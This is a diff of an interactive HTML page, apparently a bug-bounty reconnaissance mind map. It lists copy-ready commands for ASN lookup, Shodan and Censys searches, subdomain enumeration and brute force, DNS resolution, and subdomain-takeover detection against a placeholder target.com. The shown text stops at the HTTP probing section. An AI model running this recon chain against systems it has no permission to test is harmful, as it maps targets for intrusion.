@@ -2,227 +2,313 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>Bug Bounty Autopwn Framework</title>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/d3/7.8.5/d3.min.js"></script>
 <style>
-@import url('https://fonts.googleapis.com/css2?family=Source+Code+Pro:wght@300;400;500;600;700&family=Inter:wght@300;400;500;600;700&display=swap');
+@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&family=Syne:wght@400;600;700;800&display=swap');
 
-* { margin: 0; padding: 0; box-sizing: border-box; }
+*, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
 
-body {
-  background: #0d1117;
-  color: #c9d1d9;
-  font-family: 'Inter', sans-serif;
-  overflow: hidden;
-  height: 100vh;
-  width: 100vw;
+:root {
+  --bg: #080c10;
+  --surface: #0e1419;
+  --surface2: #161d26;
+  --border: #1e2a35;
+  --border2: #243040;
+  --text: #cdd9e5;
+  --text-muted: #546578;
+  --text-dim: #8899aa;
+  --accent: #4d9de0;
+  --green: #39d353;
+  --red: #f05151;
+  --purple: #a78bfa;
+  --orange: #f0883e;
+  --yellow: #e3b341;
+  --glow-blue: rgba(77,157,224,0.15);
+  --glow-green: rgba(57,211,83,0.12);
+  --glow-red: rgba(240,81,81,0.15);
 }
 
+html, body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: 'Syne', sans-serif;
+  overflow: hidden;
+  height: 100%;
+  width: 100%;
+  touch-action: pan-x pan-y;
+}
+
+/* Scanline effect */
+body::after {
+  content: '';
+  position: fixed;
+  inset: 0;
+  background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.03) 2px, rgba(0,0,0,0.03) 4px);
+  pointer-events: none;
+  z-index: 9999;
+}
+
+/* ── TOOLBAR ── */
 #toolbar {
   position: fixed; top: 0; left: 0; right: 0; z-index: 100;
-  background: rgba(13,17,23,0.92);
-  backdrop-filter: blur(12px);
-  border-bottom: 1px solid #21262d;
+  background: rgba(8,12,16,0.96);
+  backdrop-filter: blur(16px);
+  border-bottom: 1px solid var(--border);
   display: flex; align-items: center;
-  padding: 0 16px; height: 48px; gap: 8px;
+  padding: 0 12px; height: 52px; gap: 6px;
+  overflow-x: auto;
+  scrollbar-width: none;
 }
+#toolbar::-webkit-scrollbar { display: none; }
 
-#toolbar .logo {
-  font-family: 'Source Code Pro', monospace;
-  font-weight: 700; font-size: 14px;
-  color: #58a6ff; margin-right: 12px;
-  white-space: nowrap;
+.logo {
+  font-family: 'JetBrains Mono', monospace;
+  font-weight: 700; font-size: 13px;
+  color: var(--accent);
+  white-space: nowrap; flex-shrink: 0;
+  letter-spacing: -0.5px;
 }
+.logo em { color: var(--green); font-style: normal; }
+.logo span { color: var(--text-muted); }
 
-#toolbar .logo span { color: #3fb950; }
+.tb-sep { width: 1px; height: 20px; background: var(--border); margin: 0 2px; flex-shrink: 0; }
 
 .tb-btn {
-  padding: 5px 14px; border-radius: 6px;
-  font-size: 12px; font-family: 'Source Code Pro', monospace;
-  cursor: pointer; border: 1px solid #30363d;
-  background: #161b22; color: #8b949e;
-  transition: all .2s; white-space: nowrap;
+  padding: 5px 12px; border-radius: 5px;
+  font-size: 11px; font-family: 'JetBrains Mono', monospace;
+  cursor: pointer; border: 1px solid var(--border);
+  background: var(--surface); color: var(--text-muted);
+  transition: all .2s; white-space: nowrap; flex-shrink: 0;
+  letter-spacing: 0.3px;
 }
-.tb-btn:hover { background: #21262d; color: #c9d1d9; border-color: #58a6ff; }
-.tb-btn.active { background: #1f6feb20; color: #58a6ff; border-color: #58a6ff; }
-
-.tb-sep { width: 1px; height: 24px; background: #21262d; margin: 0 4px; }
+.tb-btn:hover, .tb-btn:active {
+  background: var(--surface2); color: var(--text); border-color: var(--accent);
+  box-shadow: 0 0 12px var(--glow-blue);
+}
 
 #searchBox {
-  padding: 5px 12px; border-radius: 6px; border: 1px solid #30363d;
-  background: #0d1117; color: #c9d1d9; font-size: 12px;
-  font-family: 'Source Code Pro', monospace;
-  width: 200px; outline: none;
+  padding: 5px 12px; border-radius: 5px;
+  border: 1px solid var(--border);
+  background: var(--surface); color: var(--text);
+  font-size: 11px; font-family: 'JetBrains Mono', monospace;
+  width: 160px; min-width: 100px; outline: none; flex-shrink: 0;
+  transition: border-color .2s;
 }
-#searchBox:focus { border-color: #58a6ff; }
-#searchBox::placeholder { color: #484f58; }
+#searchBox:focus { border-color: var(--accent); box-shadow: 0 0 10px var(--glow-blue); }
+#searchBox::placeholder { color: var(--text-muted); }
 
 #nodeCount {
-  margin-left: auto; font-size: 11px; color: #484f58;
-  font-family: 'Source Code Pro', monospace; white-space: nowrap;
+  margin-left: auto; font-size: 10px; color: var(--text-muted);
+  font-family: 'JetBrains Mono', monospace; white-space: nowrap; flex-shrink: 0;
 }
 
-/* CANVAS */
+/* ── CANVAS ── */
 #treeContainer {
-  position: fixed; top: 48px; left: 0; right: 0; bottom: 0;
+  position: fixed; top: 52px; left: 0; right: 0; bottom: 0;
 }
-
 svg { width: 100%; height: 100%; }
 
 .link {
   fill: none;
-  stroke: #21262d;
+  stroke: var(--border2);
   stroke-width: 1.2;
-  transition: stroke .3s;
 }
-
-.link.highlighted { stroke: #3fb950; stroke-width: 2; }
+.link.exploit { stroke: rgba(240,81,81,0.25); }
+.link.tool { stroke: rgba(57,211,83,0.18); }
+.link.phase { stroke: rgba(77,157,224,0.2); }
 
 .node { cursor: pointer; }
-
 .node circle {
-  stroke-width: 2;
-  transition: all .2s;
+  stroke-width: 1.5;
+  transition: r .2s, filter .2s;
 }
-
 .node:hover circle {
-  filter: drop-shadow(0 0 8px currentColor);
+  filter: drop-shadow(0 0 6px currentColor);
 }
-
 .node text {
-  font-family: 'Inter', sans-serif;
+  font-family: 'Syne', sans-serif;
   font-size: 12px;
-  fill: #c9d1d9;
+  fill: var(--text);
+  pointer-events: none;
+  user-select: none;
+}
+.node .cmd-hint {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 9px;
+  fill: var(--green);
+  opacity: 0.65;
   pointer-events: none;
 }
 
-.node .cmd-text {
-  font-family: 'Source Code Pro', monospace;
-  font-size: 10px;
-  fill: #3fb950;
-  opacity: 0.8;
-}
-
-/* TOOLTIP */
-#tooltip {
+/* ── TOOLTIP / DETAIL PANEL ── */
+#detailPanel {
   position: fixed;
-  background: #161b22;
-  border: 1px solid #30363d;
-  border-radius: 8px;
-  padding: 0;
-  max-width: 480px;
-  min-width: 320px;
+  background: var(--surface);
+  border: 1px solid var(--border2);
+  border-radius: 10px;
+  max-width: 460px;
+  min-width: 300px;
   z-index: 200;
   display: none;
-  box-shadow: 0 16px 48px rgba(0,0,0,0.6);
+  box-shadow: 0 20px 60px rgba(0,0,0,0.7), 0 0 0 1px rgba(77,157,224,0.1);
   overflow: hidden;
 }
 
-.tt-header {
-  padding: 12px 16px;
-  border-bottom: 1px solid #21262d;
+/* Mobile: full-bottom-sheet */
+@media (max-width: 640px) {
+  #detailPanel {
+    position: fixed !important;
+    left: 0 !important; right: 0 !important;
+    bottom: 0 !important; top: auto !important;
+    max-width: 100% !important;
+    min-width: unset !important;
+    border-radius: 16px 16px 0 0;
+    border-left: none; border-right: none; border-bottom: none;
+    max-height: 70vh;
+    overflow-y: auto;
+  }
+  #detailPanel .dp-cmd { max-height: 140px; }
+}
+
+.dp-drag {
+  display: none;
+  width: 40px; height: 4px;
+  background: var(--border2); border-radius: 2px;
+  margin: 10px auto 0;
+}
+@media (max-width: 640px) { .dp-drag { display: block; } }
+
+.dp-header {
+  padding: 14px 16px 10px;
+  border-bottom: 1px solid var(--border);
   display: flex; align-items: center; gap: 10px;
 }
-
-.tt-icon {
-  width: 32px; height: 32px; border-radius: 6px;
+.dp-icon {
+  width: 34px; height: 34px; border-radius: 7px;
   display: flex; align-items: center; justify-content: center;
-  font-size: 16px; flex-shrink: 0;
+  font-size: 17px; flex-shrink: 0;
 }
-
-.tt-title { font-weight: 600; font-size: 14px; color: #e6edf3; }
-.tt-sev {
-  font-family: 'Source Code Pro', monospace;
-  font-size: 10px; padding: 2px 8px; border-radius: 10px;
-  margin-left: auto; font-weight: 600;
+.dp-title { font-weight: 700; font-size: 14px; color: #e8f0f8; flex: 1; }
+.dp-badge {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 9px; padding: 3px 8px; border-radius: 10px;
+  font-weight: 600; letter-spacing: 0.5px; flex-shrink: 0;
 }
+.dp-close {
+  background: none; border: none; color: var(--text-muted);
+  font-size: 20px; cursor: pointer; line-height: 1;
+  padding: 0 0 0 4px; flex-shrink: 0;
+}
+.dp-close:hover { color: var(--text); }
 
-.tt-body { padding: 12px 16px; }
+.dp-body { padding: 12px 16px; }
+.dp-desc { font-size: 12px; color: var(--text-dim); line-height: 1.65; margin-bottom: 10px; }
 
-.tt-desc { font-size: 12px; color: #8b949e; line-height: 1.6; margin-bottom: 10px; }
-
-.tt-cmd-block {
-  background: #0d1117;
-  border: 1px solid #21262d;
-  border-radius: 6px;
+.dp-cmd {
+  background: var(--bg);
+  border: 1px solid var(--border);
+  border-radius: 7px;
   padding: 10px 12px;
   margin: 8px 0;
-  font-family: 'Source Code Pro', monospace;
-  font-size: 11px;
-  color: #3fb950;
-  line-height: 1.7;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 10.5px;
+  color: var(--green);
+  line-height: 1.75;
   position: relative;
-  max-height: 200px;
+  max-height: 180px;
   overflow-y: auto;
   white-space: pre-wrap;
   word-break: break-all;
+  scrollbar-width: thin;
+  scrollbar-color: var(--border) transparent;
 }
+.dp-cmd::-webkit-scrollbar { width: 4px; }
+.dp-cmd::-webkit-scrollbar-thumb { background: var(--border2); border-radius: 2px; }
 
-.tt-cmd-block .copy-btn {
+.copy-btn {
   position: absolute; top: 6px; right: 6px;
-  background: #21262d; border: 1px solid #30363d;
-  color: #8b949e; font-size: 10px; padding: 2px 8px;
+  background: var(--surface2); border: 1px solid var(--border2);
+  color: var(--text-muted); font-size: 9px; padding: 3px 8px;
   border-radius: 4px; cursor: pointer;
-  font-family: 'Source Code Pro', monospace;
+  font-family: 'JetBrains Mono', monospace;
+  transition: all .15s;
 }
-.tt-cmd-block .copy-btn:hover { color: #e6edf3; background: #30363d; }
+.copy-btn:hover { color: var(--text); background: var(--border); }
+.copy-btn.copied { color: var(--green); border-color: var(--green); }
 
-.tt-link {
-  display: inline-flex; align-items: center; gap: 6px;
-  color: #58a6ff; font-size: 12px; text-decoration: none;
-  padding: 6px 12px; border: 1px solid #21262d;
-  border-radius: 6px; margin: 4px 4px 4px 0;
-  transition: all .2s;
+.dp-link {
+  display: inline-flex; align-items: center; gap: 5px;
+  color: var(--accent); font-size: 11px; text-decoration: none;
+  padding: 6px 12px; border: 1px solid var(--border);
+  border-radius: 6px; margin: 4px 4px 0 0;
+  transition: all .2s; font-family: 'JetBrains Mono', monospace;
 }
-.tt-link:hover { background: #1f6feb20; border-color: #58a6ff; }
+.dp-link:hover { background: var(--glow-blue); border-color: var(--accent); }
 
-.tt-links { display: flex; flex-wrap: wrap; margin-top: 8px; }
-
-.tt-footer {
+.dp-footer {
   padding: 8px 16px;
-  border-top: 1px solid #21262d;
-  font-size: 10px;
-  color: #484f58;
-  font-family: 'Source Code Pro', monospace;
+  border-top: 1px solid var(--border);
+  font-size: 9px; color: var(--text-muted);
+  font-family: 'JetBrains Mono', monospace;
 }
 
-.tt-close {
-  position: absolute; top: 10px; right: 12px;
-  background: none; border: none; color: #484f58;
-  font-size: 18px; cursor: pointer; line-height: 1;
-}
-.tt-close:hover { color: #c9d1d9; }
-
-/* Legend */
+/* ── LEGEND ── */
 #legend {
-  position: fixed; bottom: 12px; left: 12px; z-index: 50;
-  background: rgba(13,17,23,0.9); border: 1px solid #21262d;
-  border-radius: 8px; padding: 12px 16px;
-  font-size: 11px; display: flex; gap: 14px; flex-wrap: wrap;
+  position: fixed; bottom: 10px; left: 10px; z-index: 50;
+  background: rgba(8,12,16,0.92); border: 1px solid var(--border);
+  border-radius: 8px; padding: 10px 14px;
+  font-size: 10px; display: flex; gap: 12px; flex-wrap: wrap;
+  font-family: 'JetBrains Mono', monospace;
+  backdrop-filter: blur(8px);
 }
+@media (max-width: 640px) {
+  #legend { display: none; }
+}
+.leg { display: flex; align-items: center; gap: 5px; color: var(--text-muted); }
+.leg-dot { width: 8px; height: 8px; border-radius: 50%; }
 
-.leg-item { display: flex; align-items: center; gap: 6px; }
-.leg-dot { width: 10px; height: 10px; border-radius: 50%; }
-
-/* Minimap hint */
+/* ── HINT ── */
 #hint {
-  position: fixed; bottom: 12px; right: 12px; z-index: 50;
-  font-family: 'Source Code Pro', monospace;
-  font-size: 10px; color: #484f58;
+  position: fixed; bottom: 10px; right: 10px; z-index: 50;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 9px; color: var(--text-muted);
+  background: rgba(8,12,16,0.88);
+  padding: 6px 10px; border-radius: 6px;
+  border: 1px solid var(--border);
 }
+@media (max-width: 640px) {
+  #hint { font-size: 9px; bottom: 8px; right: 8px; }
+}
+
+/* ── MOBILE TOUCH INDICATOR ── */
+#touchIndicator {
+  display: none;
+  position: fixed; top: 60px; left: 50%; transform: translateX(-50%);
+  background: rgba(77,157,224,0.15); border: 1px solid var(--accent);
+  border-radius: 20px; padding: 5px 14px;
+  font-family: 'JetBrains Mono', monospace; font-size: 10px;
+  color: var(--accent); z-index: 99;
+  animation: fadeOut 3s forwards;
+}
+@media (max-width: 640px) { #touchIndicator { display: block; } }
+@keyframes fadeOut { 0%,70%{opacity:1} 100%{opacity:0;pointer-events:none} }
+
+/* Scrollbars */
+* { scrollbar-width: thin; scrollbar-color: var(--border) transparent; }
 </style>
 </head>
 <body>
 
 <div id="toolbar">
-  <div class="logo">[<span>autopwn</span>]<span>.</span>framework</div>
+  <div class="logo">[<em>autopwn</em>]<span>.fw</span></div>
   <div class="tb-sep"></div>
-  <button class="tb-btn" onclick="expandAll()">⊕ Expand All</button>
-  <button class="tb-btn" onclick="collapseAll()">⊖ Collapse All</button>
-  <button class="tb-btn" onclick="resetZoom()">⌖ Reset View</button>
+  <button class="tb-btn" onclick="expandAll()">⊕ All</button>
+  <button class="tb-btn" onclick="collapseAll()">⊖ Col</button>
+  <button class="tb-btn" onclick="resetZoom()">⌖ Reset</button>
   <div class="tb-sep"></div>
-  <input type="text" id="searchBox" placeholder="Search tool or technique..." oninput="searchTree(this.value)">
+  <input type="text" id="searchBox" placeholder="Search…" oninput="searchTree(this.value)">
   <div id="nodeCount"></div>
 </div>
 
@@ -230,331 +316,350 @@ svg { width: 100%; height: 100%; }
   <svg id="treeSvg"></svg>
 </div>
 
-<div id="tooltip"></div>
-
-<div id="legend">
-  <div class="leg-item"><div class="leg-dot" style="background:#f0883e"></div>Root</div>
-  <div class="leg-item"><div class="leg-dot" style="background:#58a6ff"></div>Phase</div>
-  <div class="leg-item"><div class="leg-dot" style="background:#bc8cff"></div>Category</div>
-  <div class="leg-item"><div class="leg-dot" style="background:#3fb950"></div>Tool / Technique</div>
-  <div class="leg-item"><div class="leg-dot" style="background:#f85149"></div>Exploit Check</div>
-  <span style="color:#484f58;margin-left:8px">Click node to expand · Right-click tool for details</span>
+<div id="detailPanel">
+  <div class="dp-drag"></div>
 </div>
 
-<div id="hint">Scroll to zoom · Drag to pan · Click nodes to expand</div>
+<div id="legend">
+  <div class="leg"><div class="leg-dot" style="background:var(--orange)"></div>Root</div>
+  <div class="leg"><div class="leg-dot" style="background:var(--accent)"></div>Phase</div>
+  <div class="leg"><div class="leg-dot" style="background:var(--purple)"></div>Category</div>
+  <div class="leg"><div class="leg-dot" style="background:var(--green)"></div>Tool</div>
+  <div class="leg"><div class="leg-dot" style="background:var(--red)"></div>Exploit</div>
+  <span style="color:var(--text-muted);margin-left:6px">Tap/Click=expand · Long-press/Right-click=details</span>
+</div>
+
+<div id="hint" id="hint">
+  <span class="desktop-hint">Scroll=zoom · Drag=pan · Click=expand · Right-click=details</span>
+  <span class="mobile-hint" style="display:none">Pinch=zoom · Drag=pan · Tap=expand</span>
+</div>
+
+<div id="touchIndicator">Tap nodes to expand · Long-press for details</div>
 
 <script>
-// ════════════════════════════════════════════════════════
-// FULL DATA TREE
-// ════════════════════════════════════════════════════════
+// ═══════════════════════════════════════════════════════
+// DETECT MOBILE
+// ═══════════════════════════════════════════════════════
+const isMobile = window.matchMedia('(max-width: 640px)').matches || 'ontouchstart' in window;
+if (isMobile) {
+  document.querySelector('.desktop-hint').style.display = 'none';
+  document.querySelector('.mobile-hint').style.display = 'inline';
+}
 
+// ═══════════════════════════════════════════════════════
+// DATA — MERGED FROM ORIGINAL + IMAGE ADDITIONS
+// ═══════════════════════════════════════════════════════
 const DATA = {
-  name: "target.com",
-  icon: "🎯",
-  _color: "#f0883e",
+  name: "target.com", icon: "🎯", _color: "#f0883e",
   children: [
     {
-      name: "01 · ASN & Infrastructure",
-      icon: "🌐", _color: "#58a6ff",
+      name: "01 · ASN & Infrastructure", icon: "🌐", _color: "#4d9de0",
       children: [
-        { name: "WHOIS & Org", icon: "📋", _color: "#bc8cff", children: [
-          { name: "whois", _color:"#3fb950", cmd: "whois target.com", url: "https://who.is", desc: "Registrant org, email, nameservers, dates" },
-          { name: "Reverse WHOIS", _color:"#3fb950", cmd: "amass intel -d target.com -whois", url: "https://github.com/owasp-amass/amass", desc: "Find ALL domains owned by same org/email" },
-          { name: "theHarvester", _color:"#3fb950", cmd: "theHarvester -d target.com -b all", url: "https://github.com/laramies/theHarvester", desc: "Emails, names, subdomains from 20+ public sources" },
+        { name: "WHOIS & Org", icon: "📋", _color: "#a78bfa", children: [
+          { name: "whois", _color:"#39d353", cmd: "whois target.com", url: "https://who.is", desc: "Registrant org, email, nameservers, dates" },
+          { name: "Reverse WHOIS (amass)", _color:"#39d353", cmd: "amass intel -d target.com -whois", url: "https://github.com/owasp-amass/amass", desc: "Find ALL domains owned by same org/email" },
+          { name: "theHarvester", _color:"#39d353", cmd: "theHarvester -d target.com -b all", url: "https://github.com/laramies/theHarvester", desc: "Emails, names, subdomains from 20+ public sources" },
         ]},
-        { name: "ASN / IP Ranges", icon: "🔢", _color: "#bc8cff", children: [
-          { name: "asnmap", _color:"#3fb950", cmd: "echo target.com | asnmap -silent", url: "https://github.com/projectdiscovery/asnmap", desc: "Domain → ASN → all CIDR ranges owned by org" },
-          { name: "bgpview API", _color:"#3fb950", cmd: "curl -s https://api.bgpview.io/ip/TARGET_IP | jq '.data.prefixes'", url: "https://bgpview.io", desc: "IP → ASN → all prefixes for that ASN" },
-          { name: "mapcidr", _color:"#3fb950", cmd: "cat ip_ranges.txt | mapcidr -silent", url: "https://github.com/projectdiscovery/mapcidr", desc: "Expand CIDRs to individual IPs for targeted scanning" },
-          { name: "whois RADB", _color:"#3fb950", cmd: "whois -h whois.radb.net -- '-i origin AS12345'", url: "https://www.radb.net", desc: "Get all prefixes for an ASN from routing registry" },
+        { name: "ASN / IP Ranges", icon: "🔢", _color: "#a78bfa", children: [
+          { name: "asnmap", _color:"#39d353", cmd: "echo target.com | asnmap -silent", url: "https://github.com/projectdiscovery/asnmap", desc: "Domain → ASN → all CIDR ranges owned by org" },
+          { name: "bgpview API", _color:"#39d353", cmd: "curl -s https://api.bgpview.io/ip/TARGET_IP | jq '.data.prefixes'", url: "https://bgpview.io", desc: "IP → ASN → all prefixes for that ASN" },
+          { name: "mapcidr", _color:"#39d353", cmd: "cat ip_ranges.txt | mapcidr -silent", url: "https://github.com/projectdiscovery/mapcidr", desc: "Expand CIDRs to individual IPs for targeted scanning" },
+          { name: "whois RADB", _color:"#39d353", cmd: "whois -h whois.radb.net -- '-i origin AS12345'", url: "https://www.radb.net", desc: "Get all prefixes for an ASN from routing registry" },
         ]},
-        { name: "Shodan / Censys / FOFA", icon: "🔍", _color: "#bc8cff", children: [
-          { name: "shodan", _color:"#3fb950", cmd: "shodan search ssl.cert.subject.cn:target.com --fields ip_str,port,org", url: "https://shodan.io", desc: "All IPs serving target's SSL certs — finds hidden infra" },
-          { name: "censys", _color:"#3fb950", cmd: "censys search 'services.tls.certificates.leaf.names: target.com'", url: "https://search.censys.io", desc: "Certificate search reveals internal hostnames in SAN" },
-          { name: "fofa", _color:"#3fb950", cmd: "fofa search 'domain=\"target.com\"'", url: "https://fofa.info", desc: "Chinese search engine, finds assets Shodan misses" },
-          { name: "uncover", _color:"#3fb950", cmd: "echo target.com | uncover -e shodan,censys,fofa -silent", url: "https://github.com/projectdiscovery/uncover", desc: "Unified Shodan+Censys+FOFA search in one query" },
+        { name: "Shodan / Censys / FOFA", icon: "🔍", _color: "#a78bfa", children: [
+          { name: "shodan", _color:"#39d353", cmd: "shodan search ssl.cert.subject.cn:target.com --fields ip_str,port,org", url: "https://shodan.io", desc: "All IPs serving target's SSL certs — finds hidden infra" },
+          { name: "censys", _color:"#39d353", cmd: "censys search 'services.tls.certificates.leaf.names: target.com'", url: "https://search.censys.io", desc: "Certificate search reveals internal hostnames in SAN" },
+          { name: "fofa", _color:"#39d353", cmd: "fofa search 'domain=\"target.com\"'", url: "https://fofa.info", desc: "Chinese search engine, finds assets Shodan misses" },
+          { name: "uncover", _color:"#39d353", cmd: "echo target.com | uncover -e shodan,censys,fofa -silent", url: "https://github.com/projectdiscovery/uncover", desc: "Unified Shodan+Censys+FOFA search in one query" },
         ]},
       ]
     },
     {
-      name: "02 · Subdomain Enum",
-      icon: "📡", _color: "#58a6ff",
+      name: "02 · Subdomain Enum", icon: "📡", _color: "#4d9de0",
       children: [
-        { name: "Passive Sources", icon: "📥", _color: "#bc8cff", children: [
-          { name: "subfinder", _color:"#3fb950", cmd: "subfinder -d target.com -all -silent -o subs.txt", url: "https://github.com/projectdiscovery/subfinder", desc: "30+ passive sources: Shodan, VT, SecurityTrails, Censys..." },
-          { name: "amass", _color:"#3fb950", cmd: "amass enum -passive -d target.com -o amass.txt", url: "https://github.com/owasp-amass/amass", desc: "Most comprehensive passive OSINT — 40+ data sources" },
-          { name: "assetfinder", _color:"#3fb950", cmd: "assetfinder --subs-only target.com", url: "https://github.com/tomnomnom/assetfinder", desc: "Fast subdomain finder using CT logs and APIs" },
-          { name: "crt.sh", _color:"#3fb950", cmd: "curl -s 'https://crt.sh/?q=%25.target.com&output=json' | jq -r '.[].name_value' | sort -u", url: "https://crt.sh", desc: "Certificate Transparency logs — every cert ever issued" },
-          { name: "chaos", _color:"#3fb950", cmd: "chaos -d target.com -silent", url: "https://chaos.projectdiscovery.io", desc: "ProjectDiscovery pre-computed subdomain database" },
-          { name: "github-subdomains", _color:"#3fb950", cmd: "github-subdomains -d target.com -t GITHUB_TOKEN", url: "https://github.com/gwen001/github-subdomains", desc: "Find subdomains referenced in GitHub code" },
-          { name: "SecurityTrails", _color:"#3fb950", cmd: "curl -s -H 'APIKEY: KEY' 'https://api.securitytrails.com/v1/domain/target.com/subdomains'", url: "https://securitytrails.com", desc: "Historical DNS data catches deleted subdomains" },
-          { name: "waybackurls", _color:"#3fb950", cmd: "echo target.com | waybackurls | unfurl -u domains | sort -u", url: "https://github.com/tomnomnom/waybackurls", desc: "Extract subdomains from Wayback Machine archived URLs" },
+        { name: "Passive Sources", icon: "📥", _color: "#a78bfa", children: [
+          { name: "subfinder", _color:"#39d353", cmd: "subfinder -d target.com -all -silent -o subs.txt", url: "https://github.com/projectdiscovery/subfinder", desc: "30+ passive sources: Shodan, VT, SecurityTrails, Censys..." },
+          { name: "amass passive", _color:"#39d353", cmd: "amass enum -passive -d target.com -o amass.txt", url: "https://github.com/owasp-amass/amass", desc: "Most comprehensive passive OSINT — 40+ data sources" },
+          { name: "assetfinder", _color:"#39d353", cmd: "assetfinder --subs-only target.com", url: "https://github.com/tomnomnom/assetfinder", desc: "Fast subdomain finder using CT logs and APIs" },
+          { name: "crt.sh", _color:"#39d353", cmd: "curl -s 'https://crt.sh/?q=%25.target.com&output=json' | jq -r '.[].name_value' | sort -u", url: "https://crt.sh", desc: "Certificate Transparency logs — every cert ever issued" },
+          { name: "chaos", _color:"#39d353", cmd: "chaos -d target.com -silent", url: "https://chaos.projectdiscovery.io", desc: "ProjectDiscovery pre-computed subdomain database" },
+          { name: "github-subdomains", _color:"#39d353", cmd: "github-subdomains -d target.com -t GITHUB_TOKEN", url: "https://github.com/gwen001/github-subdomains", desc: "Find subdomains referenced in GitHub code" },
+          { name: "SecurityTrails API", _color:"#39d353", cmd: "curl -s -H 'APIKEY: KEY' 'https://api.securitytrails.com/v1/domain/target.com/subdomains'", url: "https://securitytrails.com", desc: "Historical DNS data catches deleted subdomains" },
+          { name: "waybackurls", _color:"#39d353", cmd: "echo target.com | waybackurls | unfurl -u domains | sort -u", url: "https://github.com/tomnomnom/waybackurls", desc: "Extract subdomains from Wayback Machine archived URLs" },
+          { name: "GAU", _color:"#39d353", cmd: "echo target.com | gau --threads 5 --o gau.txt", url: "https://github.com/lc/gau", desc: "URLs from Wayback, Common Crawl, AlienVault, URLScan — also used for passive subdomain mining" },
+          { name: "urlfindr", _color:"#39d353", cmd: "urlfindr -d target.com", url: "https://github.com/mhmdiaa/second-order", desc: "Discover second-order subdomains via URL pattern analysis" },
         ]},
-        { name: "Active Brute Force", icon: "🔨", _color: "#bc8cff", children: [
-          { name: "puredns", _color:"#3fb950", cmd: "puredns bruteforce wordlist.txt target.com -r resolvers.txt -w brute.txt", url: "https://github.com/d3mondev/puredns", desc: "DNS brute force with massdns, wildcard filtering, trusted resolvers" },
-          { name: "alterx", _color:"#3fb950", cmd: "cat subs.txt | alterx -silent | dnsx -silent", url: "https://github.com/projectdiscovery/alterx", desc: "Smart permutation: api-v1→api-v2, api-staging, api-dev..." },
-          { name: "dnsgen", _color:"#3fb950", cmd: "cat subs.txt | dnsgen - | puredns resolve -r resolvers.txt", url: "https://github.com/ProjectAnte/dnsgen", desc: "Generate word combinations from existing subdomains" },
-          { name: "gotator", _color:"#3fb950", cmd: "gotator -sub subs.txt -perm permutations.txt -depth 2 | dnsx -silent", url: "https://github.com/Josue87/gotator", desc: "Advanced permutation with custom depth and rules" },
+        { name: "Active Brute Force", icon: "🔨", _color: "#a78bfa", children: [
+          { name: "puredns", _color:"#39d353", cmd: "puredns bruteforce wordlist.txt target.com -r resolvers.txt -w brute.txt", url: "https://github.com/d3mondev/puredns", desc: "DNS brute force with massdns, wildcard filtering, trusted resolvers" },
+          { name: "alterx", _color:"#39d353", cmd: "cat subs.txt | alterx -silent | dnsx -silent", url: "https://github.com/projectdiscovery/alterx", desc: "Smart permutation: api-v1→api-v2, api-staging, api-dev..." },
+          { name: "dnsgen", _color:"#39d353", cmd: "cat subs.txt | dnsgen - | puredns resolve -r resolvers.txt", url: "https://github.com/ProjectAnte/dnsgen", desc: "Generate word combinations from existing subdomains" },
+          { name: "gotator", _color:"#39d353", cmd: "gotator -sub subs.txt -perm permutations.txt -depth 2 | dnsx -silent", url: "https://github.com/Josue87/gotator", desc: "Advanced permutation with custom depth and rules" },
+          { name: "AMASS + ALTERX + DNSX", _color:"#39d353", cmd: "amass enum -passive -d target.com | alterx -silent | dnsx -silent -o resolved_perms.txt", url: "https://github.com/owasp-amass/amass", desc: "Chained pipeline: amass passive → alterx permutations → dnsx resolve. The triple-combo for max coverage." },
         ]},
-        { name: "Resolution", icon: "✅", _color: "#bc8cff", children: [
-          { name: "dnsx", _color:"#3fb950", cmd: "cat all_subs.txt | dnsx -silent -a -cname -resp -o resolved.txt", url: "https://github.com/projectdiscovery/dnsx", desc: "Resolve all, extract A/CNAME records — CNAME needed for takeover" },
-          { name: "massdns", _color:"#3fb950", cmd: "massdns -r resolvers.txt -t A -o S all_subs.txt", url: "https://github.com/blechschmidt/massdns", desc: "Ultra-fast DNS resolver — 10M+ domains per hour" },
+        { name: "Resolution & Alive", icon: "✅", _color: "#a78bfa", children: [
+          { name: "dnsx", _color:"#39d353", cmd: "cat all_subs.txt | dnsx -silent -a -cname -resp -o resolved.txt", url: "https://github.com/projectdiscovery/dnsx", desc: "Resolve all, extract A/CNAME — CNAME critical for takeover detection" },
+          { name: "massdns", _color:"#39d353", cmd: "massdns -r resolvers.txt -t A -o S all_subs.txt", url: "https://github.com/blechschmidt/massdns", desc: "Ultra-fast DNS resolver — 10M+ domains per hour" },
+          { name: "httpx (alive check)", _color:"#39d353", cmd: "cat resolved.txt | httpx -silent -o alive.txt", url: "https://github.com/projectdiscovery/httpx", desc: "Filter resolved subs to only HTTP-alive hosts" },
+        ]},
+        { name: "DNS Takeover", icon: "🏴", _color: "#f05151", children: [
+          { name: "DNSTake", _color:"#f05151", cmd: "dnstake -f alive.txt -o dnstake_results.txt", url: "https://github.com/pwnesia/dnstake", desc: "Detect dangling DNS — checks if CNAME target is claimable. Fast and focused." },
+          { name: "subjack", _color:"#f05151", cmd: "subjack -w alive.txt -t 100 -o subjack.txt -a", url: "https://github.com/haccer/subjack", desc: "Check CNAME records for dangling references to claimable services" },
+          { name: "nuclei takeover", _color:"#f05151", cmd: "nuclei -l alive.txt -tags takeover -o takeovers.txt", url: "https://github.com/projectdiscovery/nuclei-templates", desc: "30+ takeover fingerprints: GitHub, Heroku, S3, Azure, Shopify..." },
+          { name: "can-i-take-over-xyz", _color:"#39d353", cmd: "# Reference guide:\n# github.com/EdOverflow/can-i-take-over-xyz\n# Check per-service fingerprint before claiming", url: "https://github.com/EdOverflow/can-i-take-over-xyz", desc: "Definitive list of which services are vulnerable to subdomain takeover" },
         ]},
       ]
     },
     {
-      name: "03 · HTTP Probing",
-      icon: "🌍", _color: "#58a6ff",
